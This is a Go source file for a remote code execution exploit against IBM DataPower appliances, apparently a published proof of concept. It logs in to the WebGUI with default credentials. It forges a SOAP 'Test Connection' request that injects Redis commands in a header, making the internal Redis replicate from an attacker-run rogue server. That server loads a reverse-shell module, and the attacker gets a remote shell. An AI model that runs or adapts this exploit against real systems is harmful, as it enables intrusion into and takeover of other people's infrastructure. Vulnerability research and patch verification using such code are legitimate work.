package main

import (
	"crypto/tls"
	"encoding/xml"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	datapowerIP := flag.String("dpip", "", "Datapower IP Address")
	datapowerWebGUIPort := flag.Int("dpport", 9090, "Datapower WebGUI Port")
	datapowerWebGUIUsername := flag.String("dpwebguiuser", "admin", "Datapower WebGUI Username")
	datapowerWebGUIPassword := flag.String("dpwebguipassword", "admin", "Datapower WebGUI Password")
	datapowerRedisPassword := flag.String("dpredispasswd", "", "Datapower Internal Redis Password")
	datapowerRedisPort := flag.Int("dpredisport", 16379, "Datapower Internal Redis Port")
	datapowerRedisModule := flag.String("dpredismodule", "redisreverseshell.so", "Redis Reverse Shell Module")
	localPort := flag.Int("fakeredisport", 8888, "Local port to run remote shell handler + fake redis server")
	localIPAddress := flag.String("fakeredisip", "", "local address to run remote shell handler + fake redis server")
	flag.Parse()
	if _, err := os.Stat(*datapowerRedisModule); os.IsNotExist(err) {
		log.Fatalf("Redis Module '%s' does not exist. Please check you compiled it with 'make' and specified it's location with the '-dpredismodule' flag", *datapowerRedisModule)
	}
	log.SetPrefix("Main      - ")
	log.Println("datapower-redis-rce-exploit - Created by Thomas Cope")
	log.Printf("Starting Rogue Redis Server...")
	fakeRedisTimeoutChannel := make(chan bool, 1)
	go FakeRedis(*localIPAddress, *localPort, fakeRedisTimeoutChannel, *datapowerRedisModule)
	log.Println("Attempting Login to Datapower...")
	endpoint := fmt.Sprintf("https://%s:%d", *datapowerIP, *datapowerWebGUIPort)
	loginForm := url.Values{}
	loginForm.Set("user", *datapowerWebGUIUsername)
	loginForm.Set("pass", *datapowerWebGUIPassword)
	loginForm.Set("domain", "default")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //Note: Datapower WebGUI Certs are usally self signed.
	}
	client := &http.Client{Transport: tr}
	r, err := http.NewRequest("POST", endpoint+"/dp/sys.login", strings.NewReader(loginForm.Encode()))
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Content-Length", strconv.Itoa(len(loginForm.Encode())))
	res, err := client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpLoginBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	type DPLoginResponse struct {
		XMLName  xml.Name `xml:"response"`
		Text     string   `xml:",chardata"`
		Result   string   `xml:"result"`
		SAMLart  string   `xml:"SAMLart"`
		Location string   `xml:"location"`
	}
	var dpLoginResult DPLoginResponse
	err = xml.Unmarshal(dpLoginBody, &dpLoginResult)
	if err != nil {
		log.Fatal(err)
	}
	if dpLoginResult.Result != "success" {
		log.Fatalf("Datapower login failed. Bad XML Return Code - %v+", dpLoginResult)
	}
	log.Println("Datapower Login OK!")
	log.Printf("Datapower Login Token = %s", dpLoginResult.SAMLart)
	log.Println("Exchanging Login token for auth cookie...")
	r, err = http.NewRequest("GET", fmt.Sprintf("%s/css/login.css?SAMLart=%s", endpoint, dpLoginResult.SAMLart), nil)
	if err != nil {
		log.Fatal(err)
	}
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	res, err = client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower login failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpLoginCookie := res.Cookies()
	log.Printf("Got login Cookie OK! - %v+", dpLoginCookie)
	log.Printf("Attempting Redis exploit via Datapower 'Test Connection'")
	forgedTestConnection := fmt.Sprintf(`<soapBoxRequest>
	<url>http://127.0.0.1:%d</url>
	<requestHeaders>
	<header name="info ">
AUTH %s
CONFIG SET dbfilename %s
SLAVEOF %s %d
	</header>
	</requestHeaders>
	<requestBody>
	<t/>
	</requestBody>
	</soapBoxRequest>`, *datapowerRedisPort, *datapowerRedisPassword, *datapowerRedisModule, *localIPAddress, *localPort)
	log.Printf("%s", forgedTestConnection)
	r, err = http.NewRequest("POST", endpoint+"/webguiapp/soapBoxAJAX", strings.NewReader(forgedTestConnection))
	if err != nil {
		log.Fatal(err)
	}
	for i := range dpLoginCookie {
		r.AddCookie(dpLoginCookie[i])
	}
	r.Header.Add("Content-Type", "application/xml")
	r.Header.Add("Content-Length", strconv.Itoa(len(forgedTestConnection)))
	r.Header.Add("X-DataPower-AJAX-Request", "TRUE")
	r.Header.Add("Origin", endpoint)
	r.Header.Add("Referer", endpoint+"/webguiapp/soapBoxAJAX")
	res, err = client.Do(r)
	if err != nil {
		log.Fatal(err)
	}
	if res.Status != "200 OK" {
		log.Fatalf("Datapower 'Test Connection' Failed. Bad HTTP Return Code - %s", res.Status)
	}
	defer res.Body.Close()
	dpTestConnectionBody, err := ioutil.ReadAll(res.Body)
	type DPTestConnectionResponse struct {
		XMLName         xml.Name `xml:"response"`
		Text            string   `xml:",chardata"`
		Dpfunc          string   `xml:"dpfunc,attr"`
		Responsecode    string   `xml:"responsecode"`
		ContentType     string   `xml:"content-type"`
		ResponseBody    string   `xml:"response-body"`
		ResponseHeaders string   `xml:"response-headers"`
		RenderedBody    string   `xml:"rendered-body"`
	}
	var dptestconnResult DPTestConnectionResponse
	err = xml.Unmarshal(dpTestConnectionBody, &dptestconnResult)
	if err != nil {
		log.Fatal(err)
	}
	if !strings.Contains(dptestconnResult.ResponseBody, "8") {
		log.Fatalf("Datapower 'Test Connection' Failed. Bad XML Return Code - %v+", dptestconnResult)
	}
	log.Printf("Datapower 'Test Connection' sent OK, waiting for redis connection...")
	select {
	case res := <-fakeRedisTimeoutChannel:
		if res == false {
			log.Fatal("Internal Error! Datapower internal redis failed to negotiate with fake redis server.")
		}
	case <-time.After(30 * time.Second):
		log.Fatal("Timeout! Datapower internal redis failed to connect to fake redis server in 30 seconds.")
	}
	log.Printf("Payload has been delivered to Datapower internal redis!")
	log.Printf("Performing clean up...")
	log.Printf("Creating Reverse Shell...")
	log.Printf("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
}
